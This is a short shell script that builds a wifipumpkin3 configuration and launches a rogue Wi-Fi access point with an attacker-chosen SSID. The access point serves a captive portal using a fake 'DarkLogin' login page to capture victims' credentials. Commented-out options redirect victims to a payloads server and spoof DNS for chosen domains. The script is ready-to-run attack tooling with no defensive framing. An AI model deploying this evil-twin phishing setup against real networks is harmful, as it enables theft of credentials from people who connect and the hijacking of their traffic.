#!/bin/sh

echo "set interface $1" > attack.pulp
echo "set ssid $2" >> attack.pulp
echo "set proxy captiveflask" >> attack.pulp
echo "set captiveflask.proxy_port 80" >> attack.pulp
#echo "set captiveflask.google true" >> attack.pulp
echo "set captiveflask.DarkLogin true" >> attack.pulp

# Redirection to payloads server (optional)

#echo "set captiveflask.force_redirect_https_connection true" >> attack.pulp
#echo "set captiveflask.force_redirect_to_url <your-dynamic-dns-url>" >> attack.pulp

echo "set captiveflask.force_redirect_sucessful_template true" >> attack.pulp
echo "ignore pydns_server" >> attack.pulp

# DNS spoofing part (optional)

#payloads_server=$(dig +short <your-dynamic-dns-url>)
#echo "use spoof.dns_spoof" >> attack.pulp
#echo "set domains <the-url-you-want-to-spoof>" >> attack.pulp
#echo "set redirectTo $payloads_server" >> attack.pulp
#echo "back" >> attack.pulp

# Type & enter <start> after wifipumpkin3 loaded the pulp configuration file

sudo wifipumpkin3 --pulp attack.pulp
